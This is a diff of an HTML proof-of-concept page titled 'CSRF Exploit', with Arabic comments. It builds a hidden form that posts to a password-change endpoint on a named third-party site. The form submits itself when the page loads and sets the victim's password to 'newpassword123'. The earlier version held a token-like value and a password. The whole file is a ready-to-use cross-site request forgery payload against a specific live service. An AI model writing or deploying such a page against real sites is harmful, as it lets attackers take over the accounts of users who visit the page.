@@ -3,16 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Test</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-    <h1>CSRF Testing</h1>
+    <h1>CSRF Exploit Test</h1>
+
+    <!-- نموذج CSRF -->
     <form id="csrfForm" method="POST" action="https://www.sarhne.com/ajax/user/change_password.html">
-        <input type="hidden" name="k" value="wZ39i63cZmRZKd1ZoXrFELv">
-        <input type="hidden" name="p" value="mm908090mm*">
+        <!-- كلمة المرور الجديدة -->
+        <input type="hidden" name="password" value="newpassword123">
+        <!-- تأكيد كلمة المرور الجديدة -->
+        <input type="hidden" name="repassword" value="newpassword123">
     </form>
+
     <script>
-        // إرسال الطلب مباشرةً عند فتح الصفحة
+        // إرسال الطلب تلقائيًا عند تحميل الصفحة
         document.getElementById("csrfForm").submit();
     </script>
 </body>
